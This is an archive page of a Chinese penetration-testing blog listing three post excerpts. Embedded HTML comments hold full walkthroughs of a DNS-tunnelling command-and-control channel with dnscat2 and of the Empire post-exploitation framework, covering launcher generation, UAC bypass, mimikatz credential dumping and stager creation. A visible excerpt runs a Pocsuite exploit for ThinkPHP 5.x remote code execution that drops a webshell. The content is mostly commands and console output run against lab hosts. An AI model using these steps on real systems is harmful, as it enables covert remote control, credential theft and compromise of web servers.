<!DOCTYPE html>
<html>

  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>倾旋的博客</title>
  <meta name="description" content="这个博客主要用来记录自己技术生涯中短小的收获和知识的备忘，还有就是一些做安全服务工作中的感受。方向可能会在不断改变：渗透测试、CTF、高效生活、应急响应、安全建设、读后感、代码审计、漏洞复现、运维杂项等等…
">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://payloads.online/page15/">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">倾旋的博客</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/posts/">Posts</a>
      
        
        <a class="page-link" href="/links/">Links</a>
      
        
        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
      
        
        <a class="page-link" href="/feed.xml">RSS</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="home">
  <a class="rss-link" href="/feed.xml">RSS Feed</a>
  <h1 class="page-heading">Articles</h1>

  <ul class="post-list">
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2018-12-18/6">Intranet Space - Dns Tunneling</a>
        </h2>
        
        <div class="post-meta">Dec 18, 2018</div>

        <div class="post-excerpt">
          <!--<h2 id="0x00-dns隧道简介">0x00 DNS隧道简介</h2>

<p>DNS Tunneling，是隐蔽信道的一种，通过将其他协议的数据封装在DNS协议中传输建立通信。</p>

<p>普通的 DNS 查询过程如下:</p>

<p>客户端发送 DNS 请求-&gt;DNS 服务器-&gt;如果 DNS 服务器寻找不到该记录-&gt;继续递归查询-&gt;寻找该域名 的 NS 记录-&gt;询问 NS 记录指向的 DNS 服务器-&gt;DNS 服务器响应-&gt;传输给客户端。</p>

<p>本次通过设置一个 NS 服务器，实现了 DNS 隧道的建立，使得服务器可向客户端发送任意命令，并且回 传命令执行的结果。
DNS 隧道是隐蔽的、可加密的数据传输隧道，基于 UDP 协议，目的端口号为 53。</p>

<p>它的缺点就是不稳定、 传输过大文件时容易失去连接，需要重新建立。</p>

<h2 id="0x01-dns隧道原理">0x01 DNS隧道原理</h2>

<p>DNS 隧道简单例子:</p>

<table>
  <thead>
    <tr>
      <th>类型</th>
      <th style="text-align: center">主机记录</th>
      <th style="text-align: right">记录值</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>NS</td>
      <td style="text-align: center">HACK</td>
      <td style="text-align: right">NS.XXX.COM</td>
    </tr>
    <tr>
      <td>A</td>
      <td style="text-align: center">NS</td>
      <td style="text-align: right">XXX.XXX.XXX.XXX</td>
    </tr>
  </tbody>
</table>

<p>首先在 DNS 解析管理平台上设置一个 NS 和一个 A 记录:</p>

<p>当我们询问 hello.HACK.XXX.COM 时，DNS 客户端发送的查询请求会递归到主机记录 NS 指向的 XXX.XXX.XXX.XXX 服务器上。
黑客通过在 XXX.XXX.XXX.XXX 服务器上监听 53 端口，即可获得 DNS 客户端发送来的请求。</p>

<h2 id="0x02-如何获得命令执行结果">0x02 如何获得命令执行结果?</h2>

<p>这里需要木马的配合，黑客会在服务器端的程序上专门设置一个 TXT 的主机记录，用于存放命令。</p>

<p>木马会不断请求 COMMAND.HACK.XXX.COM，获得 TXT 的解析结果，并执行，然后将结果进行分段加密传送至 DNS 服务器，构造一个 A 记录的查询请求。</p>

<p>例如服务端:<code class="language-plaintext highlighter-rouge">set command=ipcofig</code></p>

<p>客户端:请求 <code class="language-plaintext highlighter-rouge">COMMAND.HACK.XXX.COM</code>，得到解析结果ipconfig</p>

<p>操作系统执行后，返回结果一般如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WINDOWS IP Configuration:
......
</code></pre></div></div>

<p>此时木马将 WINDOWS IP Configuration 进行编码加密，可能是如下形式:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>U2FsdGVkX19cMV2s858WNyKHm5mRXx4VXng1nK8bFG5XKQSaO52vXKIsX0IZ1pxyCdI
</code></pre></div></div>

<p>然后拼接成域名为:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>U2FsdGVkX19cMV2s858WNyKHm5mRXx4VXng1nK8bFG5XKQSaO52vXKIsX0IZ1pxyCdI.H ACK.XXX.COM
</code></pre></div></div>

<p>服务端接收后，会使用密钥解密这串字符，得到命令执行结果。</p>

<p>这样反复的过程就能达到永久控制客户端的目的。</p>

<h2 id="0x03-如何判断是否能够建立隧道">0x03 如何判断是否能够建立隧道?</h2>

<p>使用 nslookup 工具查询 DNS 解析记录。</p>

<p>命令:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">nslookup @114.114.114.114 baidu.com</code></li>
  <li><code class="language-plaintext highlighter-rouge">nslookup @8.8.8.8 baidu.com</code></li>
  <li><code class="language-plaintext highlighter-rouge">nslookup @内网DNS Server baidu.com</code></li>
</ul>

<p>如果均能查询到 A 记录后，再换一些不常见域名，例如:translate.google.cn</p>

<p>若还是能够解析，则可以构建 DNS 隧道。</p>

<h2 id="0x04-dnscat2">0x04 dnscat2</h2>

<p>This tool is designed to create an encrypted command-and-control (C&amp;C) channel over the DNS protocol, which is an effective tunnel out of almost every network.</p>

<blockquote>
  <p><strong>dnscat2分为客户端和服务端</strong></p>
</blockquote>

<p>客户端配置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ git clone https://github.com/iagox86/dnscat2.git
$ cd dnscat2/client/
$ make
$ dnscat &lt;Domain&gt;
</code></pre></div></div>

<p>服务端配置（需要Ruby环境）：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ git clone https://github.com/iagox86/dnscat2.git
$ cd dnscat2/server/
$ gem install bundler
$ bundle install
$ ./dnscat2 --dns server=x.x.x.x,port=53
</code></pre></div></div>
<p>这一切的前提是按照0x01中的环境配置好后再操作。</p>

<p>DNS配置：</p>

<table>
  <thead>
    <tr>
      <th>类型</th>
      <th style="text-align: center">主机记录</th>
      <th style="text-align: right">记录值</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>NS</td>
      <td style="text-align: center">dns</td>
      <td style="text-align: right">ns.payloads.online</td>
    </tr>
    <tr>
      <td>A</td>
      <td style="text-align: center">ns</td>
      <td style="text-align: right">1.1.1.1</td>
    </tr>
  </tbody>
</table>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 服务器(1.1.1.1)
root@payloads:~# tcpdump udp port 53
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 客户端
nslookup hello.dns.payloads.online
</code></pre></div></div>

-->
          DNS Tunneling，是隐蔽信道的一种，通过将其他协议封装在DNS协议中传输建立通信。因为在我们的网络世界中DNS是一个必不可少的服务，所以大部分防火墙和入侵检测设备很少会过滤DNS流量，这就给DNS作为一种隐蔽信道提供了条件，从而可以利用它实现诸如远程控制，文件传输等操作，现在越来越多的研究证明DNS Tunneling也经常在僵尸网络和APT攻击中扮演着重要的角色。
          <p>
            <a class="post-link" href="/archivers/2018-12-18/6">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2018-12-18/1">Intranet Space - Empire</a>
        </h2>
        
        <div class="post-meta">Dec 18, 2018</div>

        <div class="post-excerpt">
          <!--<h2 id="0x00-简介">0x00 简介</h2>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119485032.jpg" alt="Empire" /></p>

<p>Empire is a PowerShell and Python post-exploitation agent.</p>

<p>http://www.powershellempire.com/</p>

<h2 id="0x01-安装">0x01 安装</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/EmpireProject/Empire
cd Empire/setup.sh
./install.sh
</code></pre></div></div>

<h2 id="0x02-模块介绍">0x02 模块介绍</h2>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119385408.jpg" alt="72c95569361e869b11697561d9a7fcbb.png" /></p>

<h3 id="empire-module-list">Empire Module List</h3>

<ul>
  <li>agents</li>
  <li>creds</li>
  <li>plugins</li>
  <li>stager</li>
  <li>listeners</li>
  <li>module</li>
</ul>

<h3 id="listeners">listeners</h3>

<p><code class="language-plaintext highlighter-rouge">listeners</code>的功能是监听一个端口，通过该端口给客户端传递更多的命令和载荷。</p>

<h3 id="agents">agents</h3>

<p><code class="language-plaintext highlighter-rouge">agents</code>主要是通过<code class="language-plaintext highlighter-rouge">listeners</code>获得的主机对象，可以通过<code class="language-plaintext highlighter-rouge">list</code>查看。</p>

<h3 id="stager">stager</h3>

<p><code class="language-plaintext highlighter-rouge">stager</code>主要是用于生成初级载荷，也就是木马，在客户端执行后，客户端会主动连接<code class="language-plaintext highlighter-rouge">listeners</code>监听的端口，同时服务端的<code class="language-plaintext highlighter-rouge">agents</code>列表会出现客户端的主机信息。</p>

<h3 id="module">module</h3>

<p><code class="language-plaintext highlighter-rouge">module</code>的主要功能是通过给<code class="language-plaintext highlighter-rouge">agents</code>提供更多的功能，可通过<code class="language-plaintext highlighter-rouge">searchmodule</code>搜索。</p>

<h3 id="plugins">plugins</h3>

<p><code class="language-plaintext highlighter-rouge">plugins</code>主要用于调用和管理Empire的扩展。</p>

<h3 id="creds">creds</h3>

<p><code class="language-plaintext highlighter-rouge">creds</code>是一个存储一些<code class="language-plaintext highlighter-rouge">agents</code>上获取到的凭证。</p>

<h2 id="0x03-simply-use-empire">0x03 Simply use Empire</h2>

<h3 id="如何获得agents">如何获得agents</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./empire # 启动empire
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119428165.jpg" alt="2eca886e0349b46868d2f676b44a9703.png" /></p>

<p>有285个module可以使用，1个listener在使用，0个agents。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(Empire) &gt; listeners

[*] Active listeners:

  Name              Module          Host                                 Delay/Jitter   KillDate
  ----              ------          ----                                 ------------   --------
  Hello             http            http://192.168.117.181:80            5/0.0                      

(Empire: listeners) &gt; uselistener 
dbx           http_com      http_hop      meterpreter   redirector    
http          http_foreign  http_mapi     onedrive     
</code></pre></div></div>

<p>创建一个<code class="language-plaintext highlighter-rouge">listeners</code>：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(Empire: listeners) &gt; uselistener http
(Empire: listeners/http) &gt; info

    Name: HTTP[S]
Category: client_server

Authors:
  @harmj0y

Description:
  Starts a http[s] listener (PowerShell or Python) that uses a
  GET/POST approach.

HTTP[S] Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  SlackToken        False                                        Your SlackBot API token to communicate with your Slack instance.
  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use for request (default, none, or other).
  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
  Name              True        Hello                            Name for the listener.
  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
  DefaultLostLimit  True        60                               Number of missed checkins before exiting
  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
  SlackChannel      False       #general                         The Slack channel or DM that notifications will be sent to.
  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile for the agent.
                                process.php|Mozilla/5.0 (Windows
                                NT 6.1; WOW64; Trident/7.0;
                                rv:11.0) like Gecko
  Host              True        http://192.168.117.181:80        Hostname/IP for staging.
  CertPath          False                                        Certificate path for https listeners.
  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
  Proxy             False       default                          Proxy to use for request (default, none, or other).
  UserAgent         False       default                          User-agent string to use for the staging request (default, none, or other).
  StagingKey        True        riOB0K|+*:3a~R2xQb@;U{&amp;Vth&gt;!4/Gd Staging key for initial agent negotiation.
  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
  Port              True        8089                             Port for the listener.
  ServerVersion     True        Microsoft-IIS/7.5                Server header for the control server.
  StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php

</code></pre></div></div>

<p>一般情况只需要指定Host、Port、Name即可，其他的选项可以根据场景设置。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(Empire: listeners/http) &gt; set Name newListener
(Empire: listeners/http) &gt; set Port 7788
(Empire: listeners/http) &gt; execute
[*] Starting listener 'newListener'
 * Serving Flask app "http" (lazy loading)
 * Environment: production
   WARNING: Do not use the development server in a production environment.
   Use a production WSGI server instead.
 * Debug mode: off
[+] Listener successfully started!
</code></pre></div></div>

<p>查看<code class="language-plaintext highlighter-rouge">listeners</code>：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(Empire: listeners/http) &gt; listeners

[*] Active listeners:

  Name              Module          Host                                 Delay/Jitter   KillDate
  ----              ------          ----                                 ------------   --------
  Hello             http            http://192.168.117.181:80            5/0.0                      
  newListener       http            http://192.168.117.181:7788            5/0.0                      

</code></pre></div></div>

<p>生成控制命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>launcher powershell newListener
</code></pre></div></div>

<p>在目标主机上执行这条指令后，可以获得一个<code class="language-plaintext highlighter-rouge">agent</code>。</p>

<p><strong>listeners中的Port必须和Host的端口相同</strong></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119441561.jpg" alt="5ce76e0d2cc5751a5185b435fa24dc00.png" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(Empire: listeners) &gt; agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------
 MYZBFLEX ps 192.168.117.179 DESKTOP-7KT7GL1   DESKTOP-7KT7GL1\Rvn0xsy powershell         7256   5/0.0    2018-12-18 02:14:47

(Empire: agents) &gt; 
</code></pre></div></div>

<h2 id="0x04-使用模块">0x04 使用模块</h2>

<h3 id="bypass-uac">Bypass UAC</h3>

<p>常用的有以下模块：</p>

<ul>
  <li>powershell/privesc/bypassuac</li>
  <li>powershell/privesc/bypassuac_env</li>
  <li>powershell/privesc/bypassuac_eventvwr</li>
  <li>powershell/privesc/bypassuac_fodhelper</li>
  <li>powershell/privesc/bypassuac_sdctlbypass</li>
  <li>powershell/privesc/bypassuac_tokenmanipulation</li>
  <li>powershell/privesc/bypassuac_wscript</li>
</ul>

<p>也可以直接这么使用：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(Empire: agents) &gt; interact MYZBFLEX
(Empire: MYZBFLEX) &gt; bypassuac
</code></pre></div></div>

<p>但是默认的bypassuac是使用的<code class="language-plaintext highlighter-rouge">bypassuac_eventvwr</code>，这时候就需要调用其他的了
。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(Empire: MYZBFLEX) &gt; usemodule privesc/bypassuac_fodhelper 
(Empire: powershell/privesc/bypassuac_fodhelper) &gt; info

              Name: Invoke-FodHelperBypass
            Module: powershell/privesc/bypassuac_fodhelper
        NeedsAdmin: False
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  Petr Medonos

Description:
  Bypasses UAC by performing an registry modification for
  FodHelper (based onhttps://winscripting.blog/2017/05/12
  /first-entry-welcome-and-uac-bypass/)

Comments:
  https://winscripting.blog/2017/05/12/first-entry-welcome-
  and-uac-bypass/

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  Listener   True                                  Listener to use.                        
  UserAgent  False       default                   User-agent string to use for the staging
                                                   request (default, none, or other).      
  Proxy      False       default                   Proxy to use for request (default, none,
                                                   or other).                              
  Agent      True        MYZBFLEX                  Agent to run module on.                 
  ProxyCreds False       default                   Proxy credentials                       
                                                   ([domain\]username:password) to use for 
                                                   request (default, none, or other).      

(Empire: powershell/privesc/bypassuac_fodhelper) &gt; set Listener hello
(Empire: powershell/privesc/bypassuac_fodhelper) &gt; execute
[&gt;] Module is not opsec safe, run? [y/N] y
[*] Tasked MYZBFLEX to run TASK_CMD_JOB
[*] Agent MYZBFLEX tasked with task ID 2
[*] Tasked agent MYZBFLEX to run module powershell/privesc/bypassuac_fodhelper
(Empire: powershell/privesc/bypassuac_fodhelper) &gt; [*] Agent MYZBFLEX returned results.
Job started: 9HABCE
[*] Valid results returned by 192.168.117.179
[*] Sending POWERSHELL stager (stage 1) to 192.168.117.179
[*] New agent VZWXYL4T checked in
[+] Initial agent VZWXYL4T from 192.168.117.179 now active (Slack)
[*] Sending agent (stage 2) to VZWXYL4T at 192.168.117.179

</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119464496.jpg" alt="20fb5ad72cd8b7ba728b8d0be7d08c87.png" /></p>

<p>此时<code class="language-plaintext highlighter-rouge">agents</code>列表如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(Empire: powershell/privesc/bypassuac_fodhelper) &gt; agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------
 MYZBFLEX ps 192.168.117.179 DESKTOP-7KT7GL1   DESKTOP-7KT7GL1\Rvn0xsy powershell         7256   5/0.0    2018-12-18 02:22:26
 VZWXYL4T ps 192.168.117.179 DESKTOP-7KT7GL1   *DESKTOP-7KT7GL1\Rvn0xs powershell         9392   5/0.0    2018-12-18 02:22:26

(Empire: agents) &gt; 

</code></pre></div></div>

<p>计算机名前带有<code class="language-plaintext highlighter-rouge">*</code>的<code class="language-plaintext highlighter-rouge">agents</code>才可以使用<code class="language-plaintext highlighter-rouge">*</code>结尾的模块：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Display all 204 possibilities? (y or n)
code_execution/invoke_dllinjection
code_execution/invoke_metasploitpayload
code_execution/invoke_ntsd
code_execution/invoke_reflectivepeinjection
code_execution/invoke_shellcode
code_execution/invoke_shellcodemsil
collection/ChromeDump
collection/FoxDump
collection/USBKeylogger*
collection/WebcamRecorder
collection/browser_data
collection/clipboard_monitor
collection/file_finder
collection/find_interesting_file
collection/get_indexed_item
collection/get_sql_column_sample_data
collection/get_sql_query
collection/inveigh
collection/keylogger
collection/minidump
collection/netripper
collection/ninjacopy*
collection/packet_capture*
collection/prompt
collection/screenshot
collection/vaults/add_keepass_config_trigger
collection/vaults/find_keepass_config
collection/vaults/get_keepass_config_trigger
collection/vaults/keethief
collection/vaults/remove_keepass_config_trigger
credentials/credential_injection*
credentials/enum_cred_store
credentials/invoke_kerberoast
credentials/mimikatz/cache*
credentials/mimikatz/certs*
credentials/mimikatz/command*
credentials/mimikatz/dcsync
credentials/mimikatz/dcsync_hashdump
credentials/mimikatz/extract_tickets
credentials/mimikatz/golden_ticket
credentials/mimikatz/keys*
credentials/mimikatz/logonpasswords*
credentials/mimikatz/lsadump*
credentials/mimikatz/mimitokens*
credentials/mimikatz/pth*
credentials/mimikatz/purge
credentials/mimikatz/sam*
credentials/mimikatz/silver_ticket
credentials/mimikatz/trust_keys*
credentials/powerdump*
credentials/sessiongopher
credentials/tokens
credentials/vault_credential*
exfiltration/egresscheck
exfiltration/exfil_dropbox
exploitation/exploit_eternalblue
exploitation/exploit_jboss
exploitation/exploit_jenkins
lateral_movement/inveigh_relay
lateral_movement/invoke_dcom
lateral_movement/invoke_executemsbuild
lateral_movement/invoke_psexec
lateral_movement/invoke_psremoting
lateral_movement/invoke_smbexec
lateral_movement/invoke_sqloscmd
lateral_movement/invoke_sshcommand
lateral_movement/invoke_wmi
lateral_movement/invoke_wmi_debugger
lateral_movement/jenkins_script_console
lateral_movement/new_gpo_immediate_task
management/disable_rdp*
management/downgrade_account
management/enable_multi_rdp*
management/enable_rdp*
management/get_domain_sid
management/honeyhash*
management/invoke_script
management/lock
management/logoff
management/mailraider/disable_security
management/mailraider/get_emailitems
management/mailraider/get_subfolders
management/mailraider/mail_search
management/mailraider/search_gal
management/mailraider/send_mail
management/mailraider/view_email
management/psinject
management/reflective_inject
management/restart
management/runas
management/shinject
management/sid_to_user
management/spawn
management/spawnas
management/switch_listener
management/timestomp
management/user_to_sid
management/vnc
management/wdigest_downgrade*
management/zipfolder
persistence/elevated/registry*
persistence/elevated/schtasks*
persistence/elevated/wmi*
persistence/elevated/wmi_updater*
persistence/misc/add_netuser
persistence/misc/add_sid_history*
persistence/misc/debugger*
persistence/misc/disable_machine_acct_change*
persistence/misc/get_ssps
persistence/misc/install_ssp*
persistence/misc/memssp*
persistence/misc/skeleton_key*
persistence/powerbreach/deaduser
persistence/powerbreach/eventlog*
persistence/powerbreach/resolver
persistence/userland/backdoor_lnk
persistence/userland/registry
persistence/userland/schtasks
privesc/ask
privesc/bypassuac
privesc/bypassuac_env
privesc/bypassuac_eventvwr
privesc/bypassuac_fodhelper
privesc/bypassuac_sdctlbypass
privesc/bypassuac_tokenmanipulation
privesc/bypassuac_wscript
privesc/getsystem*
privesc/gpp
privesc/mcafee_sitelist
privesc/ms16-032
privesc/ms16-135
privesc/powerup/allchecks
privesc/powerup/find_dllhijack
privesc/powerup/service_exe_restore
privesc/powerup/service_exe_stager
privesc/powerup/service_exe_useradd
privesc/powerup/service_stager
privesc/powerup/service_useradd
privesc/powerup/write_dllhijacker
privesc/tater
recon/find_fruit
recon/get_sql_server_login_default_pw
recon/http_login
situational_awareness/host/antivirusproduct
situational_awareness/host/computerdetails*
situational_awareness/host/dnsserver
situational_awareness/host/findtrusteddocuments
situational_awareness/host/get_pathacl
situational_awareness/host/get_proxy
situational_awareness/host/get_uaclevel
situational_awareness/host/monitortcpconnections
situational_awareness/host/paranoia*
situational_awareness/host/winenum
situational_awareness/network/arpscan
situational_awareness/network/bloodhound
situational_awareness/network/get_exploitable_system
situational_awareness/network/get_spn
situational_awareness/network/get_sql_instance_domain
situational_awareness/network/get_sql_server_info
situational_awareness/network/portscan
situational_awareness/network/powerview/find_foreign_group
situational_awareness/network/powerview/find_foreign_user
situational_awareness/network/powerview/find_gpo_computer_admin
situational_awareness/network/powerview/find_gpo_location
situational_awareness/network/powerview/find_localadmin_access
situational_awareness/network/powerview/find_managed_security_group
situational_awareness/network/powerview/get_cached_rdpconnection
situational_awareness/network/powerview/get_computer
situational_awareness/network/powerview/get_dfs_share
situational_awareness/network/powerview/get_domain_controller
situational_awareness/network/powerview/get_domain_policy
situational_awareness/network/powerview/get_domain_trust
situational_awareness/network/powerview/get_fileserver
situational_awareness/network/powerview/get_forest
situational_awareness/network/powerview/get_forest_domain
situational_awareness/network/powerview/get_gpo
situational_awareness/network/powerview/get_group
situational_awareness/network/powerview/get_group_member
situational_awareness/network/powerview/get_localgroup
situational_awareness/network/powerview/get_loggedon
situational_awareness/network/powerview/get_object_acl
situational_awareness/network/powerview/get_ou
situational_awareness/network/powerview/get_rdp_session
situational_awareness/network/powerview/get_session
situational_awareness/network/powerview/get_site
situational_awareness/network/powerview/get_subnet
situational_awareness/network/powerview/get_user
situational_awareness/network/powerview/map_domain_trust
situational_awareness/network/powerview/process_hunter
situational_awareness/network/powerview/set_ad_object
situational_awareness/network/powerview/share_finder
situational_awareness/network/powerview/user_hunter
situational_awareness/network/reverse_dns
situational_awareness/network/smbautobrute
situational_awareness/network/smbscanner
trollsploit/get_schwifty
trollsploit/message
trollsploit/process_killer
trollsploit/rick_ascii
trollsploit/rick_astley
trollsploit/thunderstruck
trollsploit/voicetroll
trollsploit/wallpaper
trollsploit/wlmdr
</code></pre></div></div>

<h3 id="抓取密码">抓取密码</h3>

<p>可在agents中直接调用mimikatz：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(Empire: VZWXYL4T) &gt; mimikatz
[*] Tasked VZWXYL4T to run TASK_CMD_JOB
[*] Agent VZWXYL4T tasked with task ID 1
[*] Tasked agent VZWXYL4T to run module powershell/credentials/mimikatz/logonpasswords
(Empire: VZWXYL4T) &gt; [*] Agent VZWXYL4T returned results.
Job started: EV7DPF
[*] Valid results returned by 192.168.117.179

</code></pre></div></div>

<p>默认是：powershell/credentials/mimikatz/logonpasswords</p>

<p>也可以使用usemodule指定以下模块：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>credentials/credential_injection*
credentials/enum_cred_store
credentials/invoke_kerberoast
credentials/mimikatz/cache*
credentials/mimikatz/certs*
credentials/mimikatz/command*
credentials/mimikatz/dcsync
credentials/mimikatz/dcsync_hashdump
credentials/mimikatz/extract_tickets
credentials/mimikatz/golden_ticket
credentials/mimikatz/keys*
credentials/mimikatz/logonpasswords*
credentials/mimikatz/lsadump*
credentials/mimikatz/mimitokens*
credentials/mimikatz/pth*
credentials/mimikatz/purge
credentials/mimikatz/sam*
credentials/mimikatz/silver_ticket
credentials/mimikatz/trust_keys*
credentials/powerdump*
credentials/sessiongopher
credentials/tokens
credentials/vault_credential*
</code></pre></div></div>
<h3 id="提权">提权</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>usemodule privesc/powerup/allchecks
execute
</code></pre></div></div>

<h2 id="0x05-生成stager">0x05 生成stager</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(Empire) &gt; usestager 
multi/bash                osx/macho                 windows/launcher_bat
multi/launcher            osx/macro                 windows/launcher_lnk
multi/macro               osx/pkg                   windows/launcher_sct
multi/pyinstaller         osx/safari_launcher       windows/launcher_vbs
multi/war                 osx/teensy                windows/launcher_xml
osx/applescript           windows/backdoorLnkMacro  windows/macro
osx/application           windows/bunny             windows/macroless_msword
osx/ducky                 windows/csharp_exe        windows/shellcode
osx/dylib                 windows/dll               windows/teensy
osx/jar                   windows/ducky             
osx/launcher              windows/hta             
</code></pre></div></div>

<p>生成一个bat的：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>usestager windows/launcher_bat
set Listener hello
execute
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119485031.jpg" alt="f5ddc9cdb32f7eebda8571e0dbb7dbc9.png" /></p>

<p>将bat文件在目标主机上运行即可。</p>

<p>一般情况下，生成的都是powershell指令，只是引入方式有许多种。</p>
-->
          Empire is a PowerShell and Python post-exploitation agent.
          <p>
            <a class="post-link" href="/archivers/2018-12-18/1">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2018-12-05/1">Thinkphp 5.x &lt; 5.1.31, &lt;= 5.0.23 Remote code Execute</a>
        </h2>
        
        <div class="post-meta">Dec 5, 2018</div>

        <div class="post-excerpt">
          pocsuite.org

<p>我Fork了一份，自己添加了一个插件：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/Cooolis/Pocsuite.git
python pocsuite.py <span class="nt">--url</span> http://127.0.0.1:8080/ <span class="nt">--verify</span> <span class="nt">-r</span> modules/thinkphpv5_rce.py <span class="c"># 验证漏洞</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python pocsuite.py <span class="nt">--url</span> http://127.0.0.1:8080/ <span class="nt">--attack</span> <span class="nt">-r</span> modules/thinkphpv5_rce.py <span class="c"># 获取webshell</span>

rvn0xsy@Rvn0xsy ~/G/Pocsuite&gt; python pocsuite.py <span class="nt">--url</span> http://127.0.0.1:8080/ <span class="nt">--attack</span> <span class="nt">-r</span> modules/thinkphpv5_rce.py

                              ,--. ,--.
 ,---. ,---. ,---.,---.,--.,--<span class="sb">`</span><span class="nt">--</span>,-<span class="s1">'  '</span>-.,---.  <span class="o">{</span>2.0.8-df54a3d<span class="o">}</span>
| .-. | .-. | .--<span class="o">(</span>  .-<span class="s1">'|  ||  ,--'</span>-.  .-| .-. :
| <span class="s1">'-'</span> <span class="s1">' '</span>-<span class="s1">' \ `--.-'</span>  <span class="sb">`</span><span class="s1">'  ''  |  | |  | \   --.
|  |-'</span> <span class="sb">`</span><span class="nt">---</span><span class="s1">' `---`----'</span> <span class="sb">`</span><span class="nt">----</span><span class="s1">'`--'</span> <span class="sb">`</span><span class="nt">--</span><span class="s1">'  `----'</span>
<span class="sb">`</span><span class="nt">--</span><span class="s1">'                                            http://pocsuite.org

[!] legal disclaimer: Usage of pocsuite for attacking targets without prior mutual consent is illegal.

[*] starting at 21\:04\:22

[21\:04\:22] [*] checking Thinkphp 5.x &lt; 5.1.31, &lt;= 5.0.23 远程代码执行
[21\:04\:22] [*] poc:'</span>Thinkphp 5.x &lt; 5.1.31, &lt;<span class="o">=</span> 5.0.23 远程代码执行<span class="s1">' target:'</span>http://127.0.0.1:8080/<span class="s1">'
[21\:04\:22] [+] webshell : http://127.0.0.1:8080/424.php
+------------------------+----------------+--------+-----------+-------------------------+---------+
| target-url             |    poc-name    | poc-id | component |         version         |  status |
+------------------------+----------------+--------+-----------+-------------------------+---------+
| http://127.0.0.1:8080/ | thinkphpv5_rce |  1024  |  Thinkphp | 5.x &lt; 5.1.31, &lt;= 5.0.23 | success |
